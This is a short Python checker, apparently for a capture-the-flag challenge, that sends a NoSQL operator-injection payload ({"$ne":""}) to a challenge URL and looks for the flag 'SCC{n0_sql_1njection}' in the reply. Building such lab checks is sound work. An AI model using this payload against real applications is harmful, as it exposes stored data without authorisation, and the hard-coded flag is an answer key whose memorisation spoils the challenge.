import requests
import json

url = input('Enter instance url: ')
path = "/query?search={\"$ne\":\"\"}"
complete_url = url+path

try:
    response = requests.get(complete_url)

    try:
        data = response.json()
    except json.JSONDecodeError:
        print("❌ Error: Response is not valid JSON. Challenge might be broken.")
        exit(1)

    if "SCC{n0_sql_1njection}" in json.dumps(data):
        print("✅ Challenge is working! Flag found.")
    else:
        print("⚠️ Warning: Challenge might not be working. Flag not found.")
   

except requests.exceptions.RequestException as e:
    print(f"❌ Error: Could not connect to {complete_url}. Ensure the challenge is running.")
    print(f"Details: {e}")
